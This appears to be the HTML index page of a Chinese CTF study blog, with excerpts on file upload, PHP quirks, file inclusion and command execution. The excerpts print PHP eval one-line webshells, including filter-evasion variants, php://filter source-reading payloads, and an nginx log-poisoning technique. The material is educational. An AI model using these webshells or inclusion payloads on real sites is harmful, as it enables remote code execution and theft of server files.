@@ -1,0 +1,135 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1>Mr.cheng's Blog</h1><h5>Welcome to my Blog!</h5><div class="intro-social"><a class="fa fa-github" href="//github.com/" target="_blank" title="github"></a><a class="fa fa-weibo" href="//www.weibo.com" target="_blank" title="weibo"></a><a class="fa fa-facebook" href="//www.facebook.com" target="_blank" title="facebook"></a><a class="fa fa-twitter" href="//twitter.com" target="_blank" title="twitter"></a><a class="fa fa-rss" href="/atom.xml" target="_blank" title="rss"></a></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><section id="recent-posts"><div class="recent-post-item"><div class="post-title"><a href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-27T07:25:57.000Z">2025-01-27</time></div><div class="recent-post-content">
+文件上传相关知识点介绍
+
+1.一句话木马一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
+1&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;
+
+段标签木马（过滤php大小写也可用）:
+1&lt;?=eval($_POST[&#x27;q&#x27;]);?&gt;
+
+2.过滤木马可将一句话木马修改为：
+123&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="文件包含"> 文件包含</a></div><div class="read-more"><a class="more" href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/25/php%E7%89%B9%E6%80%A7/">php特性</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-25T07:08:09.000Z">2025-01-25</time></div><div class="recent-post-content">
+php特性相关函数介绍
+
+1.intval() 函数：通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 。 故此传入?num[]&#x3D;1,产生错误返回1。 并且preg_math()传入数组参数也会直接返回0
+2.！strpos($num, “0”)：strpos() 函数查找字符串在另一字符串中第一次出现的位置 ，这里要求是第一个字符不是0
+3.in_array() 函数：存在弱比较的漏洞，如果没有设置第三个参数，in_array() 函数在比较时默 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="php特性"> php特性</a></div><div class="read-more"><a class="more" href="/2025/01/25/php%E7%89%B9%E6%80%A7/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含相关知识点介绍</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-22T01:21:08.000Z">2025-01-22</time></div><div class="recent-post-content">
+文件包含相关知识点总结
+
+php伪协议1.php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：
+base64过滤器:
+1?file=php://filter/read=convert.base64-encode/resource=flag.php
+
+从字符串中去除html和php标记:
+1php://filter/string.strip_tags/resource=index.php
+
+将内容转换为大小写:
+1php://filter/string.toup ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="文件包含"> 文件包含</a></div><div class="read-more"><a class="more" href="/2025/01/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/21/one/">ctfshow web80文件包含</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-21T01:21:08.000Z">2025-01-21</time></div><div class="recent-post-content"><blockquote>
+<p>向 Nginx 服务器发送请求时，记录会保存在 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 日志文件。那就可以传递一句话木马，保存在日志中，然后再包含日志文件，日志中的一句话木马就运行了。</p>
+</blockquote></div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="文件包含"> 文件包含</a></div><div class="read-more"><a class="more" href="/2025/01/21/one/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/20/new/">命令执行相关知识点解释</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-20T08:20:55.758Z">2025-01-20</time></div><div class="recent-post-content"><blockquote>
+<p>ctf中命令执行相关知识点总结</p>
+</blockquote></div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="http"> http</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="命令执行"> 命令执行</a></div><div class="read-more"><a class="more" href="/2025/01/20/new/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/14/hello-world/">Hello World</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-14T03:02:43.160Z">2025-01-14</time></div><div class="recent-post-content">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;
+
+More info: Writing
+Run server1$ hexo ser ...</div><div class="read-more"><a class="more" href="/2025/01/14/hello-world/#more">ReadMore</a></div><hr></div></section><nav class="cxo-page-nav"><a class="extend prev" rel="prev" href="/page/2/">&#60; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span></nav></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
